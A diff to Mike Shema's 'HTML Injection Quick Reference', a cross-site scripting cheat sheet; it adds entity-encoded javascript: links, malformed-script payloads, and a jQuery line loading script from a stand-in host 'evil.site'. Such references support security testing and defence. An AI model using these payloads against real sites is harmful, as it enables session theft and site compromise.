@@ -16,7 +16,6 @@ body {
 
 .payload {
   color: red;
-  font-size: larger;
 }
 
 .placeholder {
@@ -55,7 +54,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 -->
 <h1>HTML Injection Quick Reference (HIQR)</h1>
 <div style="float:left">Mike Shema, <a href="http://deadliestwebattacks.com">Deadliest Web Attacks</a></div>
-<div style="float:right">Last Revision: 2012-12-05 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
+<div style="float:right">Last Revision: 2013-06-25 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
 <div id="hiqr_toc" style="clear:both">
 <br>
 <a href="#hiqr_table_1">Table 1</a>: Injection Techniques for Various Parsing Contexts<br>
@@ -169,7 +168,15 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td class="example">&lt;a"" href=""onclick=alert(9)&gt;foo&lt;/a&gt;
   <tr>
   <td>CRLF instead of space
-  <td class="example">&lt;img%0a%0dsrc=""%0a%0donerror=alert(9)&gt;
+  <td class="example">&lt;img%0d%0asrc=""%0d%0aonerror=alert(9)&gt;
+<tr>
+  <td rowspan="3">HTML entity encoding
+  <td rowspan="3">JavaScript scheme<br>(Decimal, hex, unicode hex)
+  <td class="example">&lt;a href="java&amp;#115;cript:alert(9)"&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;a href="java&amp;#x73;cript:alert(9)"&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;a href="java&amp;#x0073;cript:alert(9)"&gt;foo&lt;/a&gt;
 <tr>
   <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="http://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> | <a href="http://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> ]
   <td>Unquoted
@@ -218,14 +225,18 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 &lt;a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(9)"&gt;<br>
 &lt;rect width="1000" height="1000" fill="white"/&gt;&lt;/a&gt;&lt;/svg&gt;
 <tr>
-  <td rowspan="6">Untidy markup
+  <td rowspan="8">Untidy markup
   <td rowspan="2">Missing greater-than sign
-  <td class="example">&lt;script%0a%0dalert(9)&lt;/script&gt;
+  <td class="example">&lt;script%0d%0aalert(9)&lt;/script&gt;
   <tr>
   <td class="example">&lt;script%20&lt;!--%20--&gt;alert(9)&lt;/script&gt;
   <tr>
-  <td>Recover from syntax error
+  <td rowspan="3">Recover from syntax error
   <td class="example">&lt;a href=""&amp;&lt;img&amp;amp;/onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;script/&lt;a&gt;alert(9)&lt;/script&gt;
+  <tr>
+  <td class="example">&lt;script/&lt;a&gt;alert(9)&lt;/script &lt;/a&gt;
   <tr>
   <td>Uncommon syntax
   <td class="example">&lt;a""id=a href=''onclick=alert(9)&gt;foo&lt;/a&gt;
@@ -313,7 +324,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">window[<span class="payload">/alert/.source</span>](9)
 <tr>
-  <td rowspan="6">Harness functions from a JavaScript library
+  <td rowspan="7">Harness functions from a JavaScript library
   <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
   <td class="example">angular.bind(self, alert, 9)()
   <tr>
@@ -321,6 +332,9 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td><a href="http://emberjs.com/">Ember JS</a>
   <td class="example">Ember.run(null, alert, 9)
+  <tr>
+  <td><a href="http://jquery.com">jQuery</a>
+  <td class="example">$.getScript("//evil.site/")
   <tr>
   <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
   <td class="example">_.defer(alert, 9)
